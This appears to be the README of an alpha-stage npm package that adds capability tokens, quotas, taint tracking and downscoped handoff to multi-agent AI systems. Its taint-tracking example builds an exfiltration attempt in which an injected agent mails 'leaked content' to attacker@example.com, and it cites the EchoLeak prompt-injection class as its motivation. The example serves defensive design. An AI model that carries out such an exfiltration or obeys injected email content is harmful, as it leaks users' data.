# @kernel.chat/agent-os

**POSIX for AI agents.** Permissions, namespaces, resource quotas,
content-addressed audit, and downscoped handoff. The OS-level
substrate that runs above Modal-class sandboxes (Modal, Daytona,
RunPod, E2B, local Docker) and below MCP/A2A as the wire formats
agents speak to each other.

Apache 2.0. Node 22+. Status: `v0.1.0-alpha.0` — reference
implementation, not yet certified for multi-tenant production.

```bash
npm install @kernel.chat/agent-os
```

---

## Why this exists

Anthropic ships *an* agent (Claude Code). Steinberger ships
substrates for *an* agent's automation (Peekaboo). Nobody has
shipped the OS that multiple agents share — the kernel/userspace
boundary, the permissions model, the resource accounting, the
audit-namespace isolation.

The 2025 EchoLeak vulnerability (CVE-2025-32711) and the ServiceNow
"confused deputy" pattern are the operational evidence the field
needs this. Multi-agent frameworks (AutoGen, CrewAI, LangGraph,
Swarm) treat "agent" as an application-layer abstraction over a
single trust domain. There's no syscall a malicious agent must
traverse.

This package is the syscall.

---

## The eight primitives

Synthesized from the May 2026 frontier research (`docs/frontier-2027-research.md`):

| # | Primitive | What it does | Status |
|---|---|---|---|
| 1 | `spawn(manifest)` | Fork an agent with declared identity, parent, and capability manifest. No implicit inheritance of parent tools. | ✓ shipped |
| 2 | `acap` | Signed, revocable capability tokens. `(subject, scope, ttl, max_invocations)` granted by the parent. | ✓ shipped |
| 3 | `ns` | Keyed namespace — memory, tools, audit-log view. Agents see only their namespace + mounted children. | ◐ typed; enforcement v0.2 |
| 4 | `ulimit-tok` | Per-agent token/$/wall-clock/spawn quotas. Hard kill on exceed; soft warn at threshold. | ✓ shipped |
| 5 | `chexec` | Trust-channel exec — every tool call tagged with `(caller_acap, payload_origin, taint_set)`. Tainted input cannot reach high-priv tools. | ✓ shipped |
| 6 | `audit` | Append-only, content-addressed event log per namespace. Uses `@kernel.chat/kbot-finance`'s hash-chained log. | ◐ uses kbot-finance; namespace isolation v0.2 |
| 7 | `handoff` | Task transfer with explicit capability downscoping. Receiver cannot escalate. | ✓ shipped (`downscope()`) |
| 8 | `snapshot` | Content-addressed agent state freeze. Same state → same `cid`. | — v0.2 |

Five primitives ship in v0.1; three are documented but partial. The
package is honest about which is which.

---

## Quick start

```ts
import { AgentRegistry, spawn, grant, verify, BudgetTracker } from '@kernel.chat/agent-os'
import { randomBytes } from 'node:crypto'

// 1. Create the registry (in v0.1 this is in-process; v0.2 splits it
//    out into a kernel daemon so multiple agent processes share it).
const registry = new AgentRegistry()

// 2. Spawn the root agent.
const rootKey = randomBytes(32)
const root = spawn(
  {
    parent: null,
    purpose: 'orchestrator',
    requested_capabilities: [],
    budget: {
      max_input_tokens: 1_000_000,
      max_output_tokens: 500_000,
      max_wall_clock_seconds: 3600,
      max_cost_usd: 50,
      max_children: 10,
    },
    namespace: {
      name: 'root',
      memory: [],
      tools: ['mcp_send', 'http_get', 'email_send'],
      audit_namespace: 'root:audit',
      mounts: [],
    },
  },
  { registry },
)
if (!root.ok) throw new Error(root.error.message)

// 3. Spawn a child for a specific task.
const child = spawn(
  {
    parent: root.value.manifest.id,
    purpose: 'fetch a single URL',
    requested_capabilities: [],
    budget: {
      max_input_tokens: 10_000,
      max_output_tokens: 5_000,
      max_wall_clock_seconds: 60,
      max_cost_usd: 0.5,
      max_children: 0,
    },
    namespace: {
      name: 'fetcher',
      memory: [],
      tools: ['http_get'],
      audit_namespace: 'root:fetcher:audit',
      mounts: [{ namespace: 'root:audit', mode: 'read' }],
    },
  },
  { registry },
)
if (!child.ok) throw new Error(child.error.message)

// 4. Grant the child a narrow, time-bounded capability.
const fetchCap = grant(
  {
    subject: { kind: 'tool', name: 'http_get' },
    scope: ['invoke'],
    max_invocations: 3,
    justification: 'fetch the SEC filing the user asked about',
  },
  {
    granted_by: root.value.manifest.id,
    granted_to: child.value.manifest.id,
    expires_at: new Date(Date.now() + 5 * 60_000).toISOString(),
    signing_key: rootKey,
  },
)

// 5. Verify the capability — the kernel does this before every tool call.
const trust = new Map([[root.value.manifest.id, rootKey]])
const check = verify(fetchCap, { trust })
if (!check.ok) {
  console.error('capability denied:', check.error)
} else {
  console.log('child may proceed with http_get')
}
```

---

## Taint tracking — chexec

Every tool call routes through a typed channel tagged with provenance.
Tainted inputs (fetched HTML, email body, untrusted file, message
from another agent) cannot reach high-privilege tools without an
explicit untaint by a sufficiently-trusted agent.

```ts
import { checkTaint, propagate, DEFAULT_TAINT_POLICY } from '@kernel.chat/agent-os'

// An email body is tainted at intake.
const emailTaint = {
  source: 'email' as const,
  origin: 'inbox/attacker@example.com',
  introduced_at: new Date().toISOString(),
}

// The agent later tries to send an email containing content from the inbox.
const exfilAttempt = {
  tool: 'email_send',
  args: { to: 'attacker@example.com', body: 'leaked content' },
  caller: 'agent_compromised' as any,
  acap: 'cap_email_send',
  taints: [emailTaint],
}

const result = checkTaint(exfilAttempt)
// → { ok: false, error: { code: 'taint_violation', ... } }
// The kernel refuses before the tool runs, regardless of what
// the model decides.
```

This is the kernel-level response to the EchoLeak class of LLM Scope
Violation vulnerabilities (CVE-2025-32711). The model doesn't have
to be perfectly aligned; tainted input is structurally prevented from
reaching exfil-capable tools.

---

## Downscoped handoff

When agent A passes a task to agent B, B's capabilities are
strictly subset of A's. The kernel rejects any attempt to escalate.

```ts
import { downscope } from '@kernel.chat/agent-os'

// Agent A has a capability with 10 invocations.
const aCap = grant(/* ... 10 invocations ... */)

// A wants to delegate to B with only 3 invocations.
const bCap = downscope(aCap, {
  granted_to: 'agent_b' as any,
  max_invocations: 3,
  signing_key: aKey,
})
// → ok, B has a narrower version.

// A tries to delegate to B with MORE invocations.
const bad = downscope(aCap, {
  granted_to: 'agent_b' as any,
  max_invocations: 100,
  signing_key: aKey,
})
// → { ok: false, error: { code: 'handoff_escalation_denied', ... } }
```

---

## Where this fits in the agent stack

```
┌──────────────────────────────────────────────────────────┐
│  Application: Claude Code, kbot, your-agent              │
└─────────────────────────┬────────────────────────────────┘
                          ▼
┌──────────────────────────────────────────────────────────┐
│  Protocol wire formats: MCP (agent ↔ tool), A2A          │
│                          (agent ↔ agent)                 │
└─────────────────────────┬────────────────────────────────┘
                          ▼
┌──────────────────────────────────────────────────────────┐
│  Agent OS: @kernel.chat/agent-os  ← THIS PACKAGE         │
│  permissions, namespaces, quotas, taint, handoff, audit  │
└─────────────────────────┬────────────────────────────────┘
                          ▼
┌──────────────────────────────────────────────────────────┐
│  Sandbox provider: Modal, Daytona, RunPod, E2B,          │
│                    local Docker, bare process            │
└──────────────────────────────────────────────────────────┘
```

The OS doesn't reinvent the sandbox; it's the contract between
agents that runs above the sandbox's isolation primitives.

---

## What's deliberately not in v0.1

- **Distributed kernel.** v0.1 is in-process. v0.2 splits the
  registry into a daemon so multiple agent processes can share the
  kernel.
- **Snapshot / restore.** Content-addressed agent state freeze.
  Useful for forking experimental branches; v0.2.
- **Namespace enforcement.** The types are there; the runtime
  enforcement of read-only mounts is v0.2.
- **Ed25519 signatures.** v0.1 uses HMAC-SHA256 for parity with
  kbot-finance's governance substrate. v0.2 upgrades.
- **Audit-log namespace isolation.** v0.1 routes audit through
  kbot-finance's hash-chained log directly; namespace-scoped views
  land in v0.2.

The package is intentionally honest about its `alpha.0` state.

---

## License

Apache 2.0. Built for the same open-core + commercial-premium shape
as `@kernel.chat/kbot-finance` — the OS itself stays free; commercial
offerings (multi-tenant kernel-as-a-service, certified hardware
backing, etc.) are downstream products.

---

## Acknowledgements

The eight primitives were synthesized from the May 2026 frontier
research, including the AIOS paper (Rutgers/Sky Lab, COLM 2025),
the Agent Operating Systems Blueprint preprint, the ASPLOS 2026
AgenticOS workshop call, Letta's MemGPT lineage, Google's A2A
protocol, and analysis of the EchoLeak class of vulnerabilities.

The package is positioned to be ahead of where Anthropic + Steinberger
are pushing today (cf. `docs/frontier-2027.md`). Not by competing on
their axes — by claiming the OS-level substrate slot that's still
genuinely open.
